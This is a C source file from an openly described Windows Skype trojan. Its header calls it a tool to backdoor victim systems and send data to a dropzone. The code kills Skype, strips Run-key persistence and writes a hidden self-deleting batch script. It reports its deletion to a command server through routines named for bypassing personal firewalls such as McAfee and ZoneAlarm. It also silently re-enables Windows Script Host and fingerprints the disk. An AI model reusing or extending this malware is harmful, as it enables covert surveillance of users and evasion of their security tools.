/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */





/*
 * Tool name   : 
 * Description : Tool to backdoor a MS Windows victim system and sending back
 *               data packages to the dropzone.
 * Version     : 0.2
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */





#define OEMRESOURCE

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <Shlwapi.h>
#include <winhttp.h>

#include "GeneralFunctions.h"
#include "SkypeTrojan.h"
#include "Processes.h"
#include "DetectPersonalFirewall.h"
#include "Status.h"
#include "GetInstruction_Direct.h"
#include "GeneralFunctions.h"
#include "crypto.h"

extern char *gLIID;
extern char *gBaseDirectory;
extern char *gBDEnvironmentDirs[];
extern char *gUploadServer;
extern char *gBackdoorVersion;
extern int gLocalStatusInformationValues[];





/*
 * Delete all registry entries which belong to the Skype trojan.
 *
 */

void removeFromRegistry(HKEY hKey, char *pKeyPath, char *pValuePattern, char *pHive, char *pBatchFile) 
{
  TCHAR mClass[MAX_BUF_SIZE] = TEXT(""); 
  DWORD mClassName = MAX_BUF_SIZE;
  DWORD mSubKeyCounter = 0; 
  DWORD mMaxSubKey; 
  DWORD mMaxClass;
  DWORD mValuesCounter; 
  DWORD mMaxValue;
  DWORD mMaxValueData; 
  DWORD mSecurityDescriptor; 
  FILETIME mLastWriteTime;
  DWORD mCounter, mRetCode; 
  TCHAR  mValue[MAX_BUF_SIZE]; 
  DWORD mValueLength = MAX_BUF_SIZE; 
  char mTemp[MAX_BUF_SIZE + 1];
  char mKeyData[MAX_BUF_SIZE + 1];
  DWORD mKeyDataLength;
 


  /*
   * Get the class name and the value count. 
   *
   */

  RegQueryInfoKey(hKey, mClass, &mClassName, NULL, &mSubKeyCounter,
                  &mMaxSubKey, &mMaxClass, &mValuesCounter, &mMaxValue,
                  &mMaxValueData, &mSecurityDescriptor, &mLastWriteTime);


  /*
   * Enumerate the key values and write delete command
   * to batch script file.
   *
   */

  if (mValuesCounter) 
  {
    for (mCounter = 0, mRetCode = ERROR_SUCCESS; mCounter < mValuesCounter; mCounter++) 
    { 
      mValueLength = MAX_BUF_SIZE; 
      ZeroMemory(mValue, sizeof(mValue));
      ZeroMemory(mKeyData, sizeof(mKeyData));
      mKeyDataLength = sizeof(mKeyData) - 1;
      mRetCode = RegEnumValue(hKey, mCounter, mValue, &mValueLength, NULL, NULL, (unsigned char *) mKeyData, &mKeyDataLength);

      if (mRetCode == ERROR_SUCCESS && strstr(mKeyData, pValuePattern))
      { 
        ZeroMemory(mTemp, sizeof(mTemp));
        snprintf(mTemp, sizeof(mTemp) - 1, "reg delete %s\\%s /v %s /f\n", pHive, pKeyPath, mValue);
        writeStringToFile(pBatchFile, mTemp, 0);
      }
    }
  }
}








/*
 * Check if currently logged in user is skyping
 *
 */

int isUserSkyping(void)
{
  char mTemp[MAX_BUF_SIZE + 1];
  char mBackdoorSignPath[MAX_BUF_SIZE];
  int mCounter = 0;
  int mRetVal = 1;
  FILE *mFH = NULL;




  for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
  {
    ZeroMemory(mTemp, sizeof(mTemp));

    if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
    {
      if (mTemp[strlen(mTemp) - 1] != '\\')
        strcat(mTemp, "\\");

      if (gBaseDirectory[strlen(gBaseDirectory) - 1] != '\\')
        strcat(gBaseDirectory, "\\");



      /*
       * Check if skype input/output flag is set.
       *
       */

      ZeroMemory(mBackdoorSignPath, sizeof(mBackdoorSignPath));
      snprintf(mBackdoorSignPath, sizeof(mBackdoorSignPath) - 1, "%s%s%s", mTemp, gBaseDirectory, RECORDING_INPUT_FLAG_FILE);


      if (PathFileExists(mBackdoorSignPath))
      {
        mRetVal = 0;
        break;
      }

      ZeroMemory(mBackdoorSignPath, sizeof(mBackdoorSignPath));
      snprintf(mBackdoorSignPath, sizeof(mBackdoorSignPath) - 1, "%s%s%s", mTemp, gBaseDirectory, RECORDING_OUTPUT_FLAG_FILE);

      if (PathFileExists(mBackdoorSignPath))
      {
        mRetVal = 0;
        break;
      }
    }
  } // for(mCounter = 0; gBDEn...


  return(mRetVal);
}







/*
 * Delete all files/processes/registry entries that belong to
 * Skype trojan
 *
 */

void deleteEverything()
{
  HKEY mHKey;
  HANDLE mSnap = INVALID_HANDLE_VALUE;
  HANDLE mProcHandle = INVALID_HANDLE_VALUE;
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];
  char mDirectory[MAX_BUF_SIZE + 1];
  char mDirectory2[MAX_BUF_SIZE + 1];
  char mDirectoryPattern[MAX_BUF_SIZE + 1];
  char mFullPath[MAX_BUF_SIZE];
  int mCounter = 0;
  WIN32_FIND_DATA mFindFileData;
  HANDLE mFindHandle = INVALID_HANDLE_VALUE;
  FILE *mFH = NULL;
  char *mTempPointer = NULL;
  char *mBat = NULL;
  char mTempBatName[] = "_uninsep.bat" ;
  char mModuleName[MAX_BUF_SIZE + 1];
  char mTempPath[MAX_BUF_SIZE + 1];
  char mFolder[MAX_BUF_SIZE + 1];
  int mRetVal = 0;
  HINSTANCE mShellRetVal = 0;
  char mTempl[] = 
    ":Repeat\r\n"
	"sleep 1\r\n"
    "del \"%s\"\r\n"
    "if exist \"%s\" goto Repeat\r\n";
  char mProxyName[MAX_BUF_SIZE + 1];
  char mProxyPort[128];
  char mProxyConnection[MAX_BUF_SIZE + 1];
  char mSkypeProcessPath[MAX_BUF_SIZE + 1];
  gMyPFWCircumventionStatus fPFWCircumventionStatus[DEFINITION_COUNTER];
  int mCircumventionType = 0;
  int mHTTPUploadResult = 0;
  DWORD mPID = 0;

  STARTUPINFO si;
  PROCESS_INFORMATION  pi;  
  char mCmdLine[MAX_BUF_SIZE];
  int mSkypeKilled = 1;



  /*
   * Create and initialize batch file 
   *
   */

  GetTempPath(sizeof(mTempPath) - 1, mTempPath);
  strcat(mTempPath, mTempBatName);

  GetModuleFileName(NULL, mModuleName, sizeof(mModuleName) - 1) ;
  strcpy (mFolder, mModuleName) ;

  mTempPointer = strrchr(mFolder, '\\');
  if (mTempPointer != NULL)
    *mTempPointer = 0 ;


  mBat = (char*) malloc(strlen(mTempl) + strlen(mModuleName) * 2 + strlen(mTempPath) + 20);
  ZeroMemory(mBat, strlen(mTempl) + strlen(mModuleName) * 2 + strlen(mTempPath) + 20);
  wsprintf(mBat, mTempl, mModuleName, mModuleName, mTempPath);

  mFH = fopen(mTempPath, "w");
  fprintf(mFH, "%s\n", mBat);
  fclose(mFH);



  /*
   * Terminate Skype.
   *
   */

  ZeroMemory(mTemp, sizeof(mTemp));
  strcat(mTemp, "skype");
  if ((mPID = getProcessID(mTemp, mSkypeProcessPath, sizeof(mSkypeProcessPath) - 1)) != 0 && mSkypeProcessPath[0] != NULL)
  {
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(mCmdLine, sizeof(mCmdLine));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    snprintf(mCmdLine, MAX_BUF_SIZE, "\"%s\" /shutdown", mSkypeProcessPath);
    if (CreateProcess(NULL, mCmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, 0, NULL, &si, &pi) != 0)
      mSkypeKilled = 0;

    Sleep(3000);  // timing
  }




  /*
   * Terminate running cscript processes
   *
   */

  ZeroMemory(mTemp, sizeof(mTemp));
  snprintf(mTemp, sizeof(mTemp) - 1, "cscript");
  killProcessByName(mTemp);

  Sleep(1000);   // timing




  /*
   * List registry entries
   *
   */

  ZeroMemory(mTemp, sizeof(mTemp));
  snprintf(mTemp, sizeof(mTemp) -1, "%s", "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN");
  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, mTemp, 0, KEY_QUERY_VALUE, &mHKey ) == ERROR_SUCCESS)
  {
    removeFromRegistry(mHKey, mTemp, gBaseDirectory, "HKLM", mTempPath);
    RegCloseKey(mHKey);
  }

  if(RegOpenKeyEx(HKEY_CURRENT_USER, mTemp, 0, KEY_QUERY_VALUE, &mHKey ) == ERROR_SUCCESS)
  {
    removeFromRegistry(mHKey, mTemp, gBaseDirectory, "HKCU", mTempPath);
    RegCloseKey(mHKey);
  }




  /*
   * List all files to delete.
   *
   */

  ZeroMemory(mTemp, sizeof(mTemp));
  snprintf(mTemp, sizeof(mTemp) - 1, "mkdir %s\n", TEMPORARY_DIRECTORY);
  writeStringToFile(mTempPath, mTemp, 0);


  mCounter = 0;
  while (gBDEnvironmentDirs[mCounter])
  {  
    ZeroMemory(mDirectory, sizeof(mDirectory));
    GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mDirectory, MAX_BUF_SIZE);


    /*
     * If entry is a drive and no directory add a ":".
     *
     */

    if (mDirectory[strlen(mDirectory) - 1] == ':')
      strcat(mDirectory, "\\");
    else if (mDirectory[strlen(mDirectory) - 1] != '\\')
      strncat (mDirectory, "\\", 1);


    ZeroMemory(mDirectory2, sizeof(mDirectory2));
    strncpy(mDirectory2, mDirectory, sizeof(mDirectory2));

    if (gBaseDirectory[strlen(gBaseDirectory) - 1] != '\\')
      strcat(gBaseDirectory, "\\");

    strncat(mDirectory, gBaseDirectory, sizeof(mDirectory));

    ZeroMemory(mDirectoryPattern, sizeof(mDirectoryPattern));
    snprintf(mDirectoryPattern, sizeof(mDirectoryPattern) - 1, "%s*", mDirectory);


    /*
     * Write delete command for files and directories
     * into the batch file.
     *
     */

    if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE) 
    {
      ZeroMemory(mFullPath, sizeof(mFullPath));
      snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", mDirectory, mFindFileData.cFileName);

      if (PathIsDirectory(mFullPath)) 
      {
        if (strcmp(mFindFileData.cFileName, ".") && strcmp(mFindFileData.cFileName, ".."))
        {
          ZeroMemory(mTemp, sizeof(mTemp));
          snprintf(mTemp, sizeof(mTemp) - 1, "rmdir /s /q \"%s\"\n", mFullPath);
          writeStringToFile(mTempPath, mTemp, 0);
        }
      } else {
        ZeroMemory(mTemp, sizeof(mTemp));
        snprintf(mTemp, sizeof(mTemp) - 1, "del /f /q \"%s\" || move \"%s\" %s\n", mFullPath, mFullPath, TEMPORARY_DIRECTORY);
        writeStringToFile(mTempPath, mTemp, 0);
      } // if (PathIsDirectory(mFullPath))





      /*
       *
       *
       */

      while (FindNextFile(mFindHandle, &mFindFileData) != 0) 
      {
        ZeroMemory(mFullPath, sizeof(mFullPath));
        snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", mDirectory, mFindFileData.cFileName);

        if (PathIsDirectory(mFullPath)) 
        {
          if (strcmp(mFindFileData.cFileName, ".") &&
              strcmp(mFindFileData.cFileName, ".."))
          {
            ZeroMemory(mTemp, sizeof(mTemp));
            snprintf(mTemp, sizeof(mTemp) - 1, "rmdir /s /q \"%s\"\n", mFullPath);
            writeStringToFile(mTempPath, mTemp, 0);
          }
        } else {
          ZeroMemory(mTemp, sizeof(mTemp));
          snprintf(mTemp, sizeof(mTemp) - 1, "del /f /q \"%s\" || move \"%s\" %s\n", mFullPath, mFullPath, TEMPORARY_DIRECTORY);
          writeStringToFile(mTempPath, mTemp, 0);
        } // if (PathIsDirectory(mFullPath))
      } // while (FindNextFile(mFindHandle, &mFindFileData) != 0)


      ZeroMemory(mTemp, sizeof(mTemp));
      snprintf(mTemp, sizeof(mTemp) - 1, "rmdir /s /q \"%s\" || move \"%s\" %s\n", mDirectory, mDirectory, TEMPORARY_DIRECTORY);
      writeStringToFile(mTempPath, mTemp, 0);
    } // if ((mFindHandle = FindFirstFile(mDirectoryPattern ...




    /*
     * If base directory has several subdirectories, delete the FIRST recursively
     *
     */

    if (strchr(gBaseDirectory, '\\') != NULL)
    {
      ZeroMemory(mTemp, sizeof(mTemp));
      ZeroMemory(mFullPath, sizeof(mFullPath));

      strncpy(mTemp, gBaseDirectory, strchr(gBaseDirectory, '\\') - gBaseDirectory);
      snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", mDirectory2, mTemp);

      if (PathFileExists(mFullPath))
      {
        ZeroMemory(mTemp2, sizeof(mTemp2));
        snprintf(mTemp2, sizeof(mTemp2) - 1, "rmdir /s /q \"%s\" || move \"%s\" %s\n", mFullPath, mFullPath, TEMPORARY_DIRECTORY);
        writeStringToFile(mTempPath, mTemp2, 0);
      }
    }

    mCounter++;
  } // while (gBDEnvironmentDirs[mCounter])



  /*
   * Kill all our processes (except this one)
   *
   */

  killOurProcesses(gBaseDirectory);




  /*
   * Restart Skype if necessary and delete yourself
   *
   */

  if (mSkypeKilled == 0 && mSkypeProcessPath[0] != 0)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    snprintf(mTemp, sizeof(mTemp) - 1, "\"%s\" /nosplash /minimized\n", mSkypeProcessPath);
    writeStringToFile(mTempPath, mTemp, 0);
  }


  ZeroMemory(mTemp, sizeof(mTemp));
  snprintf(mTemp, sizeof(mTemp) - 1, "del \"%s\"\n", mTempPath);
  writeStringToFile(mTempPath, mTemp, 0);


  SetCurrentDirectory("c:\\");


  /*
   * Before deleting the whole installation, call home and tell them about 
   * the deletion.
   *
   */

  fPFWCircumventionStatus[DEFINITION_NOPFW] = &getInstruction_DirectMain;
  fPFWCircumventionStatus[DEFINITION_OUTPOST] = &getInstruction_DirectMain;
  fPFWCircumventionStatus[DEFINITION_MCAFEE] = &getInstruction_DirectMain;
  fPFWCircumventionStatus[DEFINITION_MCAFEE_2] = &getInstruction_DirectMain;
  fPFWCircumventionStatus[DEFINITION_ZONEALARM] = &getInstruction_DirectMain;
  fPFWCircumventionStatus[DEFINITION_BITDEFENDER] = &getInstruction_DirectMain;
  fPFWCircumventionStatus[DEFINITION_FSECURE] = &getInstruction_DirectMain;
  fPFWCircumventionStatus[DEFINITION_KERIO] = &getInstruction_DirectMain;
  fPFWCircumventionStatus[DEFINITION_AVG] = &getInstruction_DirectMain;
  fPFWCircumventionStatus[DEFINITION_WEBROOT] = &getInstruction_DirectMain;

  mCircumventionType = getPFWInstallation();
  

  /*
   * Try to set the "deleted" status, until we get a positive reception status.
   *
   */

  mHTTPUploadResult = 1;
  ZeroMemory(mTemp, sizeof(mTemp));


  while(mHTTPUploadResult != 0 || strstr(mTemp, HTTP_TRANSMISSION_OK) == NULL)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    snprintf(mTemp, sizeof(mTemp) - 1, "http://%s%s?liid=%s&version=%s&status=%d", gUploadServer, HTTP_INPUT_SCRIPT, gLIID, gBackdoorVersion, gLocalStatusInformationValues[ST_DELETED]);


    ZeroMemory(mProxyConnection, sizeof(mProxyConnection));
    if (getProxySettings(mProxyName, mProxyPort) == 1)
      snprintf(mProxyConnection, MAX_BUF_SIZE, "%s:%s", mProxyName, mProxyPort);

    mHTTPUploadResult = fPFWCircumventionStatus[mCircumventionType](mTemp, mProxyConnection, REQUEST_TYPE_SYSTEMUP);
    Sleep(1000);
  }





  /*
   * Delete everything, run the deöetopm script. 
   *
   */

  mShellRetVal =  ShellExecute(NULL, "open", mTempPath, NULL, "c:\\", SW_HIDE);
  free(mBat);
}








/*
 * To keep integrity, delete all requested recording flags (if necessary)
 *
 */

void deleteRecordingFlag(char *pMarkerFile)
{
  char mTemp[MAX_BUF_SIZE + 1];
  char mUploadDirFullPath[MAX_BUF_SIZE + 1];
  int mCounter = 0;

  for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mUploadDirFullPath, sizeof(mUploadDirFullPath));

    if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
    {
      if (mTemp[strlen(mTemp) - 1] != '\\')
        strcat(mTemp, "\\");
      
      snprintf(mUploadDirFullPath, sizeof(mUploadDirFullPath) - 1, "%s\\%s\\%s", mTemp, gBaseDirectory, pMarkerFile);

      if (PathFileExists(mUploadDirFullPath))
        DeleteFile(mUploadDirFullPath);
    }
  }  
}





/*
 * Set neutral cursor icons.
 * 
 */

void setNeutralCursor()
{
  HCURSOR mCursor;

  
  if ((mCursor = LoadCursorFromFile("c:\\windows\\Cursors\\ARROW_M.CUR")) == NULL)
    goto END;


  if (SetSystemCursor(mCursor, OCR_NORMAL))
    ShowCursor(TRUE);

  if (SetSystemCursor(mCursor, OCR_APPSTARTING))
    ShowCursor(TRUE);

  if (SetSystemCursor(mCursor, OCR_NORMAL))
    ShowCursor(TRUE);


END:

  return;
}





/*
 * Check if windows scripting host is activated
 *
 */

int isScriptingActive()
{
  int mRetVal = 1;
  int mRegValue = 0;
  HKEY mKey = NULL;
  char *mEnableValue = NULL;
  long mValueType = 0;
  unsigned long mPathLength = 0;


  if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Script Host\\Settings\\", 0, KEY_READ, &mKey) == ERROR_SUCCESS)
  {
    mValueType = REG_SZ;
    if (RegQueryValueEx(mKey, "Enable", 0, (unsigned long *) &mValueType, NULL, &mPathLength) == ERROR_SUCCESS)
    {
      if (mPathLength > 0)
      {     
        if ((mEnableValue = (char *) HeapAlloc(GetProcessHeap(), 0 , mPathLength)) != NULL)
        {
          ZeroMemory(mEnableValue, mPathLength);
          RegQueryValueEx(mKey, "Enable", 0, (unsigned long *) &mValueType, (unsigned char *) mEnableValue, &mPathLength);

          mRegValue = atoi(mEnableValue);
        
          if (mRegValue <= 0)
            mRetVal = 1; // scripting is inactive
          else
            mRetVal = 0; // scripting is active

          HeapFree(GetProcessHeap(), 0, mEnableValue);
          mEnableValue = NULL;
        } // if ((mEnableValue = (char *) HeapAlloc(GetProcessHeap(), 0 , mPathLength)) == NULL)
      } // if (mPathLength > 0)
    } // if (RegQueryValueEx(mKey, "Enable", 0, (unsigned long *) &mValueType, NULL, &mPathLength) == ERROR_SUCCESS)
    RegCloseKey(mKey);
  } // if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Script Host\\Settings\\", 0, KEY_READ, &mKey)


  return(mRetVal);
}





/*
 * Activate the windows scripting host environment.
 *
 */
    
void activateWindowsScriptingHost()
{    
  HKEY mKey = NULL;
  STARTUPINFO si;
  PROCESS_INFORMATION pi;



  /*
   * Deactivate system error beep in the registry
   *
   */

  if(RegOpenKeyEx(HKEY_CURRENT_USER,"Control Panel\\Sound\\", 0, KEY_WRITE, &mKey) == ERROR_SUCCESS)
  {
    RegSetValueEx(mKey, "Beep", 0, REG_SZ, (unsigned char *) "no", 2);
    RegCloseKey(mKey);
  }



  /*
   * Set registry values.
   *
   */
  
  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Script Host\\Settings\\", 0, KEY_WRITE, &mKey) == ERROR_SUCCESS)
  {
    RegSetValueEx(mKey, "Enable", 0, REG_SZ, (unsigned char *) "1", 1);
    RegCloseKey(mKey);
  }


  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Scripting Host\\Settings\\", 0, KEY_WRITE, &mKey) == ERROR_SUCCESS)
  {
    RegSetValueEx(mKey, "Enable", 0, REG_SZ, (unsigned char *) "1", 1);
    RegCloseKey(mKey);
  }
  



  /*
   * Load vbs DLL.
   *
   */
  
  ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
  ZeroMemory(&si, sizeof(STARTUPINFO));  
  
  si.cb = sizeof(STARTUPINFO);
  si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE; 
  
  CreateProcess(NULL, "regsvr32 /s vbscript.dll", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
  CloseHandle(pi.hProcess); 
  CloseHandle(pi.hThread);
}





/*
 * Get harddisk ID.
 *
 */

int getHardDiskID(char *pHDID, int pHDIDBufferSize)
{
  char *mDrive = "c:\\";
  char mVolumeBuffer[MAX_BUF_SIZE + 1];
  char mNameBuff[MAX_BUF_SIZE + 1];
  DWORD mSer = 0;
  DWORD mFileFlags = 0;
  DWORD mMaxFileLength = 0;
  int mRetVal = 1;


  ZeroMemory(mVolumeBuffer, sizeof(mVolumeBuffer));
  ZeroMemory(mNameBuff, sizeof(mNameBuff));
  ZeroMemory(pHDID, pHDIDBufferSize);

  if (GetVolumeInformation(mDrive, mVolumeBuffer, sizeof(mVolumeBuffer), &mSer, &mMaxFileLength, &mFileFlags, mNameBuff, sizeof(mNameBuff)))
  {
    snprintf(pHDID, pHDIDBufferSize - 1, "%lX", mSer);
    mRetVal = 0;
  }

  return(mRetVal);
}








/*
 * Translate lower case to upper case
 *
 */

void lowerToUpperCase(char *pString)
{
  int mCounter;
       
  for(mCounter = 0; mCounter < (int) strlen(pString); mCounter++)
    if(pString[mCounter] >= 97 && pString[mCounter] < 123)
      pString[mCounter] -= 32;  
}





/*
 * Write/attach a string to a file
 *
 */

void writeStringToFile(char *pFilePath, char *pDataBuffer, int pCreateFile)
{

  FILE *mFH = NULL;
  DWORD mLen = 0;


  if (pCreateFile)
    mFH  = fopen(pFilePath, "w");
  else
    mFH  = fopen(pFilePath, "a");

  fputs(pDataBuffer, mFH);
  fclose(mFH);
}





/*
 * Get current proxy settings
 *
 */

int getProxySettings(char *ProxyName, char *ProxyPort)
{
  HINTERNET hHttpSession = NULL;
  HINTERNET hConnect = NULL;
  HINTERNET hRequest = NULL;
  WINHTTP_CURRENT_USER_IE_PROXY_CONFIG pProxyConfig;
  WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions;
  WINHTTP_PROXY_INFO ProxyInfo;
  DWORD cbProxyInfoSize = sizeof(ProxyInfo);
  WCHAR lpszAutoConfigUrl[256];
  char ProxyConnection[MAX_BUF_SIZE + 1];
  unsigned int Counter = 0;
  unsigned int ColonStat = 0;
  unsigned int i = 0;
  unsigned int mRetVal = 0;
  char mTemp[MAX_BUF_SIZE + 1];



  ZeroMemory(ProxyName, sizeof(ProxyName));
  ZeroMemory(ProxyPort, sizeof(ProxyPort));
  ZeroMemory(ProxyConnection, sizeof(ProxyConnection));
  ZeroMemory(&AutoProxyOptions, sizeof(AutoProxyOptions));
  ZeroMemory(&ProxyInfo, sizeof(ProxyInfo));



  if(!(hHttpSession = WinHttpOpen(L"WinHTTP AutoProxy Sample/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) 
    goto END;
  if (!(hConnect = WinHttpConnect(hHttpSession, LTESTHOST, INTERNET_DEFAULT_HTTP_PORT, 0))) 
    goto END;
  if (!(hRequest = WinHttpOpenRequest(hConnect, L"GET", L"", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0))) 
    goto END;



  if (WinHttpGetIEProxyConfigForCurrentUser(&pProxyConfig))
  {
    if (pProxyConfig.lpszAutoConfigUrl != NULL)
    {
      wcscpy(lpszAutoConfigUrl, pProxyConfig.lpszAutoConfigUrl); 
      AutoProxyOptions.lpszAutoConfigUrl = lpszAutoConfigUrl;
      AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
      AutoProxyOptions.dwAutoDetectFlags = 0;
		  
      if(WinHttpGetProxyForUrl(hHttpSession, L"http://www.microsoft.com", &AutoProxyOptions, &ProxyInfo) && ProxyInfo.lpszProxy != NULL)
      {

        /*
         * Fill in proxy name and port
         *
         */

        wcstombs(ProxyConnection, ProxyInfo.lpszProxy, MAX_BUF_SIZE);

        if (strchr(ProxyConnection, ';'))
        {
          ZeroMemory(mTemp, sizeof(mTemp));
          strncpy(mTemp, ProxyConnection, strchr(ProxyConnection, ';') - ProxyConnection);
          ZeroMemory(ProxyConnection, sizeof(ProxyConnection));
          strncpy(ProxyConnection, mTemp, sizeof(ProxyConnection));
        }

	
        for (i = 0; i < strlen(ProxyConnection); i++)
        {
          if (ProxyConnection[i] == ':')
          {
            Counter = 0;
            ColonStat = 1;
            continue;
          }
        
          if (ColonStat)
            ProxyPort[Counter] = ProxyConnection[i];
          else 
            ProxyName[Counter] = ProxyConnection[i];
  
          Counter++;    
        }

        mRetVal = 1;
        goto END;
      }
    } else if (pProxyConfig.lpszProxy != NULL) {
      wcstombs(ProxyConnection, pProxyConfig.lpszProxy, MAX_BUF_SIZE);
      for (i = 0; i < strlen(ProxyConnection); i++)
      {
        if (ProxyConnection[i] == ':')
        {
          Counter = 0;
          ColonStat = 1;
          continue;
        }
        
        if (ColonStat)
          ProxyPort[Counter] = ProxyConnection[i];
        else 
          ProxyName[Counter] = ProxyConnection[i];
  
        Counter++;    
      }
	  
      mRetVal = 1;
      goto END;
    }		
  } else {
    AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
    AutoProxyOptions.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
    AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

    if(WinHttpGetProxyForUrl(hHttpSession, LTESTHOST, &AutoProxyOptions, &ProxyInfo))
    {

      /*
       * Found a proxy.pac via DNS/DHCP!!
       *
       */

      wcstombs(ProxyConnection, ProxyInfo.lpszProxy, MAX_BUF_SIZE);

      for (i = 0; i < strlen(ProxyConnection); i++)
      {
        if (ProxyConnection[i] == ':')
        {
          Counter = 0;
          ColonStat = 1;
          continue;
        }
        
        if (ColonStat)
          ProxyPort[Counter] = ProxyConnection[i];
        else 
          ProxyName[Counter] = ProxyConnection[i];
  
        Counter++;    
      }

      mRetVal = 1;
      goto END;
    }
  }


  /*
   * Clean up the WINHTTP_PROXY_INFO structure
   *
   */

END:

  if (ProxyInfo.lpszProxy != NULL) 
    GlobalFree(ProxyInfo.lpszProxy);
  if (ProxyInfo.lpszProxyBypass != NULL) 
    GlobalFree(ProxyInfo.lpszProxyBypass);
  if (hRequest != NULL) 
    WinHttpCloseHandle(hRequest);
  if (hConnect != NULL) 
    WinHttpCloseHandle(hConnect);
  if (hHttpSession != NULL) 
    WinHttpCloseHandle(hHttpSession);
  if (pProxyConfig.lpszProxy != NULL) 
    GlobalFree(pProxyConfig.lpszProxy);
  if (pProxyConfig.lpszProxyBypass != NULL) 
    GlobalFree(pProxyConfig.lpszProxyBypass);
  if (pProxyConfig.lpszAutoConfigUrl != NULL) 
    GlobalFree(pProxyConfig.lpszAutoConfigUrl);

  return(mRetVal);
}